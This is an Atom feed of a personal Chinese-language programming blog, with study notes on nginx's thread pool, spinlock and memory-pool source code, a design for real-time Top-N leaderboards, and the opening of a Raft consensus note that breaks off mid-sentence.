<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H-ZeX</title>
  
  <subtitle>H-ZeX&#39;s Coding Life</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://h-zex.github.io/"/>
  <updated>2019-09-21T07:46:36.013Z</updated>
  <id>https://h-zex.github.io/</id>
  
  <author>
    <name>H-ZeX</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>My Nginx Src Read Note</title>
    <link href="https://h-zex.github.io/2019/08/23/my-nginx-src-read-note/"/>
    <id>https://h-zex.github.io/2019/08/23/my-nginx-src-read-note/</id>
    <published>2019-08-23T13:58:41.000Z</published>
    <updated>2019-09-21T07:46:36.013Z</updated>
    
    <content type="html"><![CDATA[<h2 id="thread-pool"><a href="#thread-pool" class="headerlink" title="thread_pool"></a><code>thread_pool</code></h2><h3 id="ngx-thread-pool-init"><a href="#ngx-thread-pool-init" class="headerlink" title="ngx_thread_pool_init"></a><code>ngx_thread_pool_init</code></h3><ul><li>创建的是detached类型的线程</li><li>有一段类似于注释掉的代码，把thread的栈大小设置为<code>PTHREAD_STACK_MIN</code></li><li>线程中运行的函数是<code>ngx_thread_pool_cycle</code></li><li>要注意的是pthread中，main函数退出，那么即使还有线程没有结束，依然是程序退出。而这里并没有去等待这些线程。另外，这里不能使用join去等待，因为这是detached的线程</li><li>这是一个确定大小的线程池，并且没有线程复活的机制——似乎也并不会出现线程失败而进程还活着的情况？所以并不需要线程复活的机制</li></ul><h3 id="ngx-thread-pool-destroy"><a href="#ngx-thread-pool-destroy" class="headerlink" title="ngx_thread_pool_destroy"></a><code>ngx_thread_pool_destroy</code></h3><ul><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">ngx_thread_pool_destroy(<span class="keyword">ngx_thread_pool_t</span> *tp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ngx_uint_t</span>           n;</span><br><span class="line">    <span class="keyword">ngx_thread_task_t</span>    task;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">ngx_uint_t</span>  lock;</span><br><span class="line"></span><br><span class="line">    ngx_memzero(&amp;task, <span class="keyword">sizeof</span>(<span class="keyword">ngx_thread_task_t</span>));</span><br><span class="line"></span><br><span class="line">    task.handler = ngx_thread_pool_exit_handler;</span><br><span class="line">    task.ctx = (<span class="keyword">void</span> *) &amp;lock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; tp-&gt;threads; n++) &#123;</span><br><span class="line">        lock = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ngx_thread_task_post(tp, &amp;task) != NGX_OK) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 在exit的函数里会设置lock为0，</span></span><br><span class="line">        <span class="keyword">while</span> (lock) &#123;</span><br><span class="line">            ngx_sched_yield();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        task.event.active = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>) ngx_thread_cond_destroy(&amp;tp-&gt;cond, tp-&gt;<span class="built_in">log</span>);</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>) ngx_thread_mutex_destroy(&amp;tp-&gt;mtx, tp-&gt;<span class="built_in">log</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里是通过往任务队列push进exit任务来实现destroy的（该任务的handler是<code>ngx_thread_pool_exit_handler</code>）。然后不断等待<code>lock</code>变量（已用volatile修饰）变为<code>0</code>，才开始destroy下一个线程</p></li><li>我觉得这里之所以不用一个<code>lock</code>数组，从而无需同步的等待线程退出，或许有如下原因<ul><li>用数组的实现方式大约是：不断push shutdown任务，直到所有线程都被push了shutdown任务。然后再跑一个轮询，等待lock数组里的元素都变为0，期间如果遇到非0的元素，要么停下来等待，要么收集起来，用于下一次轮询。无论是那种，逻辑都很复杂</li><li>关闭线程池不需要很快。线程池是非常重量的，所以不宜频繁关闭打开，那么关闭其实是一个占比很小的需求，所以简单实现下就好</li></ul></li><li>我以前自己实现的线程池是设置一个state变量，这个变量的存活期与整个线程池的存活期一样行。这个state变量是一个atomic变量，并且被worker（在nginx中对应的就是<code>ngx_thread_pool_cycle</code>函数）不断读取——每次循环都要读取两次。从而有非常高的同步开销。这里，这个volatile变量只有在shutdown期间才存在，所以开销低非常多</li></ul><h3 id="ngx-thread-pool-queue-t"><a href="#ngx-thread-pool-queue-t" class="headerlink" title="ngx_thread_pool_queue_t"></a><code>ngx_thread_pool_queue_t</code></h3><ul><li>表示一个单链表，节点是<code>ngx_thread_task_t</code>类型</li><li><p>定义</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">ngx_thread_task_t</span> *first;</span><br><span class="line">    <span class="keyword">ngx_thread_task_t</span> **last; </span><br><span class="line">&#125; <span class="keyword">ngx_thread_pool_queue_t</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>last</code>字段存最后一个<code>ngx_thread_task_t</code>类型的元素的next字段的地址，从而需要append一个元素到末尾时，只需要解引用该字段写入<code>ngx_thread_task_t*</code>类型的数据即可</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ngx_thread_pool_done.last = task;</span><br><span class="line">ngx_thread_pool_done.last = &amp;task-&gt;next;</span><br></pre></td></tr></table></figure></li><li><p>append到单链表末尾也是O(1)的复杂度（因为我们有最末尾元素的next字段的地址）。当然，添加到头部也是O(1)的复杂度</p></li></ul><h3 id="ngx-thread-pool-cycle"><a href="#ngx-thread-pool-cycle" class="headerlink" title="ngx_thread_pool_cycle"></a><code>ngx_thread_pool_cycle</code></h3><ul><li>流程是<ul><li>先block掉大部分信号（除了SIGILL、SIGFPE、SIGSEGV、SIGBUS以及其他不能被忽略和捕获的信号——比如SIGKILL、SIGSTOP）</li><li>跑一个无限循环<ul><li>在循环中加锁获取queue头部的task对象，如果无法获取，使用条件变量等待。中间如果出现错误则<code>return</code></li><li>获取task对象后run这个task对象的handler</li><li>使用spin lock加锁，加锁成功后把这个task对象放到done队列尾部</li><li>加入到队列后，会有个GCC的编译器内存屏障，使得<blockquote><p>Added appropriate ngx_memory_barrier() calls to make sure all modifications will happen before the lock is released(来自这句statement的commit msg)</p></blockquote></li><li>之后调用notify函数，传入<code>ngx_thread_pool_handler</code>函数的地址</li></ul></li></ul></li><li><p>里面有这么一段</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ngx_spinlock(&amp;ngx_thread_pool_done_lock, <span class="number">1</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line">*ngx_thread_pool_done.last = task;</span><br><span class="line">ngx_thread_pool_done.last = &amp;task-&gt;next;</span><br><span class="line"></span><br><span class="line">ngx_memory_barrier();</span><br><span class="line"></span><br><span class="line">ngx_unlock(&amp;ngx_thread_pool_done_lock);</span><br></pre></td></tr></table></figure><ul><li>commit msg对<code>ngx_memory_barrier</code>的解释是（注意，这里的<code>ngx_memory_barrier</code>并不是CPU内存屏障，而是编译器的内存屏障）<blockquote><p>Thread pools: memory barriers in task completion notifications. The <code>ngx_thread_pool_done</code> object isn’t volatile, and at least some compilers assume that it is permitted to reorder modifications of volatile and non-volatile objects. Added appropriate <code>ngx_memory_barrier()</code> calls to make sure all modifications will happen before the lock is released. Reported by Mindaugas Rasiukevicius, <a href="http://mailman.nginx.org/pipermail/nginx-devel/2016-April/008160.html" target="_blank" rel="noopener">http://mailman.nginx.org/pipermail/nginx-devel/2016-April/008160.html</a></p></blockquote></li><li>这里之所以不使用mutex，我认为有这几个原因<ul><li>这里竞争不激烈，所以重量锁不必要</li></ul></li></ul></li></ul><h3 id="ngx-thread-task-alloc"><a href="#ngx-thread-task-alloc" class="headerlink" title="ngx_thread_task_alloc"></a><code>ngx_thread_task_alloc</code></h3><ul><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ngx_thread_task_t</span> *</span><br><span class="line">ngx_thread_task_alloc(<span class="keyword">ngx_pool_t</span> *pool, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ngx_thread_task_t</span>  *task;</span><br><span class="line"></span><br><span class="line">    task = ngx_pcalloc(pool, <span class="keyword">sizeof</span>(<span class="keyword">ngx_thread_task_t</span>) + size);</span><br><span class="line">    <span class="keyword">if</span> (task == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    task-&gt;ctx = task + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> task;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这个函数非常有意思，这是一个被外部调用的函数，用来获得task结构的。其把ctx（也就是具体的work函数的参数）分配在紧邻结构体的地方，从而使得结构体本身与结构体内ctx指针的内存位置连在一起，对cache非常友好</p></li></ul><h3 id="ngx-thread-task-post"><a href="#ngx-thread-task-post" class="headerlink" title="ngx_thread_task_post"></a><code>ngx_thread_task_post</code></h3><ul><li>用于往任务队列里push task对象</li><li>这个push是线程安全的，但是要求所有的请求排队——因为是使用thread pool的mutex来加锁几乎整个函数体的</li><li>这里用的是加锁、push对象，cond signal的策略。<code>ngx_thread_pool_cycle</code>的函数也是用加锁、cond wait的策略来获取任务的。这里并没有使用spin-lock加上重型锁（就是mutex）来优化。可能的原因我认为有<ul><li>需要条件变量，所以需要锁mutex——如果用spin lock，那其实无需条件变量</li><li>可能push任务这个需求并不是非常频繁，反而任务执行才是重点——目前nginx的线程池好像只是用于异步磁盘IO。另一方面，如果执行任务的时间比push任务的时间比起来更小，或者是相差不大，那其实并没有使用线程池的必要——直接在当前线程运行就好，因为push进线程池本身就有非常大的开销，并且线程一多，上下文切换的开销也大，从nginx的设计理念来讲，只要不是阻塞操作（比如磁盘IO是阻塞操作（读写文件似乎不能Nonblocking），网络IO可以不阻塞），都没有必要使用线程池</li></ul></li></ul><h3 id="与我自己的线程池的对比"><a href="#与我自己的线程池的对比" class="headerlink" title="与我自己的线程池的对比"></a>与我自己的线程池的对比</h3><ul><li><a href="https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp" target="_blank" rel="noopener">我的线程池</a></li><li>nginx的优点<ul><li>ngxin不需要维护线程池的state变量（该变量是atomic的，并且被频繁读取，读取这种变量开销很大），从而同步开销小</li><li>线程池中需要同步的变量很少很少，并且对这些变量的操作也非常少，从而同步开销小</li></ul></li><li></li></ul><h2 id="spin-lock"><a href="#spin-lock" class="headerlink" title="spin_lock"></a><code>spin_lock</code></h2><ul><li><p>主要代码如下</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ngx_spinlock(<span class="keyword">ngx_atomic_t</span> *lock, <span class="keyword">ngx_atomic_int_t</span> value, <span class="keyword">ngx_uint_t</span> spin)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ngx_uint_t</span>  i, n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( ;; ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*lock == <span class="number">0</span> &amp;&amp; ngx_atomic_cmp_set(lock, <span class="number">0</span>, value)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ngx_ncpu &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; spin; n &lt;&lt;= <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                    ngx_cpu_pause();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (*lock == <span class="number">0</span> &amp;&amp; ngx_atomic_cmp_set(lock, <span class="number">0</span>, value)) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次spin过去了还没有拿到锁，则让出cpu</span></span><br><span class="line">        ngx_sched_yield();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>ngx_atomic_cmp_set</code>会插入编译器的memory barrier，不是cpu的memory barrier（以下<a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html" target="_blank" rel="noopener">Ref from GCC doc</a>）</p><blockquote><p>“memory”</p><ul><li>The “memory” clobber tells the compiler that <strong>the assembly code performs memory reads or writes to items other than those listed in the input and output operands</strong> (for example, accessing the memory pointed to by one of the input parameters). </li><li>To ensure memory contains correct values, GCC <strong>may need to flush specific register values to memory before executing the asm</strong>. </li><li>Further, <strong>the compiler does not assume that any values read from memory before an asm remain unchanged after that asm; it reloads them as needed.</strong> </li><li><strong>Using the “memory” clobber effectively forms a read/write memory barrier for the compiler.</strong></li><li><strong>Note that this clobber does not prevent the processor from doing speculative reads past the asm statement. To prevent that, you need processor-specific fence instructions</strong>.</li><li>flush to memory代价很高，gcc还允许一些细致的优化，见原文</li></ul></blockquote> <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">     NGX_SMP_LOCK</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">"    cmpxchgq  %3, %1;   "</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">"    sete      %0;       "</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// 按照GCC内联汇编的文档，受影响列表中的`memory`会导致`Using the "memory" clobber effectively forms a read/write memory barrier for the compiler.`</span></span></span></span><br><span class="line">: "=a" (res) : "m" (*lock), "a" (old), "r" (set) : "cc", "memory");</span><br></pre></td></tr></table></figure></li><li><p>spin lock除非拿到锁，否则不会返回</p></li><li>传入一个参数<code>spin</code>，<code>uintptr_t</code>类型，用于指示每次指数退避地等待的过程的长度。增大该参数可以在拿不到锁的情况下有效的降低CPU空转的时间，但也降低了竞争到锁的概率。不过在不繁忙时，该参数过大将导致等待锁的时间过长</li><li>pause直接使用cpu的<code>pause</code>指令实现（以下Ref from intel manual）<blockquote><ul><li>Improves the performance of spin-wait loops</li><li>When executing a “spin-wait loop,” processors will suffer a severe performance penalty when exiting the loop <strong>because it detects a possible memory order violation.</strong> （意思应该是说，频繁的读取一个volatile位置，使得需要反复的同步等，从而很昂贵（比如java 的volatile具有acquire-release语义，读取也是非常昂贵的））The PAUSE instruction provides a hint to the processor that the code sequence is a spin-wait loop. The processor uses this hint to avoid the memory order violation in most situations, which greatly improves processor performance. For this reason, <strong>it is recommended that a PAUSE instruction be placed in all spin-wait loops.</strong></li><li>An additional function of the PAUSE instruction is to reduce the power consumed by a processor while executing a spin loop</li><li>In earlier IA-32 processors, the PAUSE instruction operates like a NOP instruction. The Pentium 4 and Intel Xeon processors implement the PAUSE instruction as a delay. The delay is finite and can be zero for some processors. This instruction does not change the architectural state of the processor (that is, it performs essentially a delaying no-op operation). This instruction’s operation is the same in non-64-bit modes and 64-bit mode.</li></ul></blockquote></li><li><code>cmpxchgq</code><ul><li>从intel的手册来看，这个指令并没有memory barrier。这里存疑，从nginx线程池上下文来看，这个spin lock是需要memory barrier，因为<code>ngx_thread_pool_handler</code>看其来应该是在另一个线程运行的（否则也就不需要lock了），所以肯定是需要memory barrier的。然而，unlock的操作实在是非常简单<code>#define ngx_unlock(lock)    *(lock) = 0</code>，并没有构成lock和unlock的闭合——memory barrier似乎都是需要成对出现的</li><li><blockquote><p><strong>This instruction can be used with a LOCK prefix to allow the instruction to be executed atomically</strong></p></blockquote></li><li><blockquote><p>To simplify the interface to the processor’s bus, the destination operand receives a write cycle without regard to the result of the comparison. The destination operand is written back if the comparison fails; otherwise, the source operand is written into the destination. (The processor never produces a locked read without also producing a locked write.)</p></blockquote></li></ul></li><li><p><code>ngx_sched_yield</code></p><ul><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_HAVE_SCHED_YIELD)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ngx_sched_yield()  sched_yield()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ngx_sched_yield()  usleep(1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>按照<code>sched_yield</code>的 manual</p><blockquote><p><code>sched_yield()</code>  is  intended  for  use with read-time scheduling policies (i.e., <code>SCHED_FIFO</code> or <code>SCHED_RR</code>).  <strong>Use of <code>sched_yield()</code> with nondeterministic scheduling policies such as <code>SCHED_OTHER</code> is unspecified and very likely means your application design is broken.</strong></p></blockquote></li><li>那么这里nginx应该是实时进程？（TODO）</li></ul></li></ul><h2 id="内存池"><a href="#内存池" class="headerlink" title="内存池"></a>内存池</h2><h3 id="ngx-memalign"><a href="#ngx-memalign" class="headerlink" title="ngx_memalign"></a><code>ngx_memalign</code></h3><ul><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Linux has memalign() or posix_memalign()</span></span><br><span class="line"><span class="comment"> * Solaris has memalign()</span></span><br><span class="line"><span class="comment"> * FreeBSD 7.0 has posix_memalign(), besides, early version's malloc()</span></span><br><span class="line"><span class="comment"> * aligns allocations bigger than page size at the page boundary</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (NGX_HAVE_POSIX_MEMALIGN || NGX_HAVE_MEMALIGN)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">ngx_memalign</span><span class="params">(<span class="keyword">size_t</span> alignment, <span class="keyword">size_t</span> size, <span class="keyword">ngx_log_t</span> *<span class="built_in">log</span>)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ngx_memalign(alignment, size, log)  ngx_alloc(size, log)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>如果有<code>posix_memalign</code>或<code>memalign</code>那么是直接使用这两个函数实现，否则是使用<code>malloc</code>实现，malloc的man中有这么一句</p><blockquote><p>The  malloc()  and  calloc()  functions  return a pointer to the allocated memory, which is <strong>suitably aligned for any built-in type</strong><br> 我使用<code>x86_64</code>的<code>linux 5.0.0-25-generic</code>做实验，每次返回的指针最后4bit都是0，也就是16B对齐</p></blockquote></li><li><blockquote><p>在一些UNIX实现中， 无法通过调用free()来释放由memalign()分配的内存，因为此类memalign()在实现时使用malloc()来分配内存块，然后返回一个指针，指向该内存块内已对齐的适当地址（也就是指针不是指向这个块的边界，而是指向块内的某处）</p></blockquote></li><li>以下引用自<a href="https://zhuanlan.zhihu.com/p/77246009" target="_blank" rel="noopener">OceanBase内存管理原理解析</a><blockquote><p>全局内存池的意义如下：</p><ul><li>全局内存池可以统计每个模块的内存使用情况，如果出现内存泄露，可以很快定位到发生问题的模块。</li><li>全局内存池可用于辅助调试。例如，可以将全局内存池中申请到的内存块按字节填充为某个非法的值（比如0xFE），当出现内存越界等问题时，服务器程序会很快在出现问题的位置Core Dump，而不是带着错误运行一段时间后才Core Dump，从而方便问题定位。</li><li>总而言之，OceanBase的内存管理没有采用高深的技术，也没有做到通用或者最优，但是很好地满足了系统初期的两个最主要的需求：可控性以及没有内存碎片。</li></ul></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;thread-pool&quot;&gt;&lt;a href=&quot;#thread-pool&quot; class=&quot;headerlink&quot; title=&quot;thread_pool&quot;&gt;&lt;/a&gt;&lt;code&gt;thread_pool&lt;/code&gt;&lt;/h2&gt;&lt;h3 id=&quot;ngx-thread-pool-
      
    
    </summary>
    
      <category term="Linux" scheme="https://h-zex.github.io/categories/Linux/"/>
    
    
      <category term="nginx" scheme="https://h-zex.github.io/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>在高并发情况下，如何实时构建TopN list</title>
    <link href="https://h-zex.github.io/2019/08/14/how-to-make-real-time-top-n-list/"/>
    <id>https://h-zex.github.io/2019/08/14/how-to-make-real-time-top-n-list/</id>
    <published>2019-08-14T13:34:41.000Z</published>
    <updated>2019-09-21T07:44:46.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><ul><li>比如某个大型游戏举办大赛，要做一个<strong>实时</strong>的TopN列表，比如前一百名</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="积分比较稳定并且最大涨-落幅度有限的情况"><a href="#积分比较稳定并且最大涨-落幅度有限的情况" class="headerlink" title="积分比较稳定并且最大涨/落幅度有限的情况"></a>积分比较稳定并且最大涨/落幅度有限的情况</h4><ul><li>如果说积分比较稳定，并且积分的增长和降落是有上限的（比如每天最多可以打<code>m</code>局游戏，并且每次最多涨/落<code>maxp</code>分），那么还是很好解决的</li><li>首先在比赛开始前，我们对全量数据（假设数据库表中，积分这个字段是无序的）跑一次全量分析型事务，获得积分前n的所有人的列表，假设第n个人的积分是<code>k</code>，那么再获取到积分大于等于<code>k-maxp*m</code>的人的列表。那么我们可以预期比赛过程中的TopN一定在这些人中产生</li><li>假设最后一个人是<code>p</code>分，那么对于比赛过程中出现的大于等于<code>p</code>分的人，也加入到list中，以保证这个list确实涵盖了前M名（M就是积分最少为<code>k-maxp*m</code>的人的数目）</li><li>因为会出现“禁赛”等各种情况，所以可以以1.x倍去获取这个名单，更好的处理方案是按照下文的“积分比较稳定但是最大涨/落幅度无限的情况”去处理</li><li>还有另一个措施，如果比赛过程中，我们这个list的人数低于一定值，那么就再跑一次全量分析型事务，去补充这个list</li><li>全量分析任务如何跑？<ul><li>首先对于该全量数据某一时刻的快照，跑一次全量分析事务，拿到前百分之<code>x</code>的list</li><li>假设拿到的list中，最后一名的分数<code>p</code>，再跑一次全量分析任务，把上一个分析任务过程中新加进来的大于<code>p</code>分的人加进list中</li><li>注意，在跑这个新的分析任务时，新出现的，大于<code>p</code>分人的也要实时加入list中</li></ul></li></ul><h4 id="积分比较稳定但是最大涨-落幅度无限的情况"><a href="#积分比较稳定但是最大涨-落幅度无限的情况" class="headerlink" title="积分比较稳定但是最大涨/落幅度无限的情况"></a>积分比较稳定但是最大涨/落幅度无限的情况</h4><ul><li>先获取前<code>n*k</code>(比如k是100)的人的list，可以期望TopN都出现在这个list中</li><li>假设第<code>n*k</code>人是<code>p</code>分，那么对于比赛过程中出现的大于等于<code>p</code>分的人，也加入到list中，以保证这个list确实涵盖了前<code>n*k</code>名。当然，对于小于<code>p</code>分的我们也要清除掉</li><li>然后如果比赛过程这个list中的人数低于一定值，跑一次全量分析任务，补充这个list</li></ul><h4 id="全量计算"><a href="#全量计算" class="headerlink" title="全量计算"></a>全量计算</h4><ul><li>数据都放在红黑树中，然后每次用户改变自己的积分，就去更改该用户对应的node，然后对该树进行iter，拿到前n个用户，组成list</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; title=&quot;场景&quot;&gt;&lt;/a&gt;场景&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;比如某个大型游戏举办大赛，要做一个&lt;strong&gt;实时&lt;/strong&gt;的TopN列表，比如前一百名&lt;/li&gt;
&lt;/ul&gt;
&lt;h
      
    
    </summary>
    
      <category term="工程" scheme="https://h-zex.github.io/categories/%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="TopN" scheme="https://h-zex.github.io/tags/TopN/"/>
    
      <category term="高并发" scheme="https://h-zex.github.io/tags/%E9%AB%98%E5%B9%B6%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>My Raft Log</title>
    <link href="https://h-zex.github.io/2019/08/03/my-raft-log/"/>
    <id>https://h-zex.github.io/2019/08/03/my-raft-log/</id>
    <published>2019-08-03T15:28:21.000Z</published>
    <updated>2019-08-05T17:03:53.861Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://github.com/maemual/raft-zh_cn" target="_blank" rel="noopener">raft-zh_cn</a></li><li><a href="https://www.yuque.com/huarou/gd4szw/zon6t9" target="_blank" rel="noopener">蚂蚁金服开源 SOFAJRaft：生产级 Java Raft 算法库</a></li></ul><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><ul><li>共识是多个参与者针对某一件事达成完全一致。已达成一致的结论，不可推翻（领导人绝不删除或覆盖自己的日志，only append，并且领导人的日志绝对正确）</li><li>复制状态机通常基于复制日志实现。因为每个状态机都是确定的，所以每一次执行操作都产生相同的状态和相同的序列。一旦指令被正确的复制，每一个服务器的状态机按照日志顺序处理他们，然后输出结果被返回给客户端。因此，服务器集群看起来形成一个高可靠的状态机。<strong>保持日志的相同就是共识算法的工作了</strong></li><li>Raft可以提供以下特性<ul><li>安全：在非拜占庭错误情况下，包括网络延迟、分区、丢包、冗余和乱序等错误都可以保证正确</li><li>可用：大多数机器work那么该集群就work，宕机的节点当有稳定的存储的时候可以从状态中恢复回来并重新加入集群</li><li>不依赖时序来保证一致性: 物理时钟错误或者极端的消息延迟只有在最坏情况下才会导致可用性问题</li><li>集群的响应速度取决于最快的大部分机器</li></ul></li><li>作用<ul><li>在低可靠的普通x86服务器上构建一个高可靠的整体，使得即使有少部分机器宕机，集群依然可用（当然选举的过程中集群是不可用的）<blockquote><p>普通服务器具有良好的性价比，因此在互联网等行业得到了广泛的应用。但普通服务器也不得不面对2%-4%的年故障率([1])，于是必须高可用的传统数据库只得很悲催地使用性价比低得可怜的高可靠服务器。分布式一致性协议（distributed consensus 